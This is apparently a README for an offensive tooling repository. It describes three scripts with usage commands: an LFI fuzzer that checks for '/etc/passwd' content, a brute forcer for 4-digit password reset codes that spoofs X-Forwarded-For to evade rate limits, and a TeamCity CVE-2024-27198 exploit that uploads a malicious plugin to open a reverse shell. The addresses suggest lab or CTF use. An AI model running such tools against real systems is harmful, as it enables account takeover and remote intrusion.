# FuzzingTools

## LFI Fuzzer

A multithreaded Local File Inclusion (LFI) fuzzing tool with a Rich progress bar.
It sends payloads from a wordlist to a target URL, checks for successful inclusion based on keywords, and saves results.

## Usage

python3 lfi_fuzzer.py -w wordlist.txt -u "http://target.com/page?file={}" -t 10 \
-H headers.txt -o all_results.txt -s success.txt -k "root:x:,Windows" -S

## 4-Digit Recovery Code Brute Forcer

This Python script brute-forces a 4-digit numeric recovery code on a vulnerable reset_password.php endpoint. It uses threading, random spoofed IPs (X-Forwarded-For), and a provided PHP session to bypass rate-limiting and speed up the attack.

## Usage
python3 bypass_rate_limiting.py -ip <TARGET_IP> -p <PORT> -SID <PHPSESSID> -t <THREADS>

## TeamCity Evil Plugin Exploit

This script automates the process of building, uploading, enabling, and triggering a malicious TeamCity plugin that provides a reverse shell.

## Usage
python3 teamcity_CVE-2024-27198.py -t http://target:8111 -l 10.10.14.5 -p 4444
